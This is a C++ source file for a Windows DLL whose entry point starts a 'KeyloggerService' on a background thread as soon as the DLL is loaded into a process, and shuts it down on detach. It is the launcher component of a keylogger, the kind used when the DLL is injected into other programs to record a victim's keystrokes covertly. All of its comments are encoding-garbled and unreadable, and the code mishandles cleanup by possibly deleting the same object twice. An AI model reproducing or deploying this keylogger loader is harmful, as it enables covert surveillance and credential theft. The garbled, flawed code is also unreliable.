#include <Windows.h>
#include "KeyloggerService.h"

// ���������� ���������� ��� ��������� �������
HANDLE hEvent;
KeyloggerService* myApp;

DWORD WINAPI myThreadFunc(LPVOID lpParam)
{
    const std::vector<std::string> args;
    myApp = new KeyloggerService();

    // �������������� ����������
    myApp->main();

    // ������� ������� �� ������������ ��������
    WaitForSingleObject(hEvent, INFINITE);
    if (myApp)delete myApp;
    return 0;
}

HANDLE hThread;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // ������� �������
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        //myApp = new KeyloggerService();

        // �������������� ����������
        //myApp->main();
        // ������� �����, ������� ����� ��������� ����������� �������
        hThread = CreateThread(NULL, 0, myThreadFunc, NULL, 0, NULL);
        
        // ��������� ���������� �������� ������
        if (hThread == NULL)
        {
            // ��������� ������
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // ������������� ������, ��� ����� ��������� ������
        SetEvent(hEvent);
        
        // ���� ���������� ������
        WaitForSingleObject(hThread, INFINITE);
        if (myApp)delete myApp;
        // ��������� ���������� ������� � ������
        CloseHandle(hEvent);
        CloseHandle(hThread);

        break;
    }
    return TRUE;
}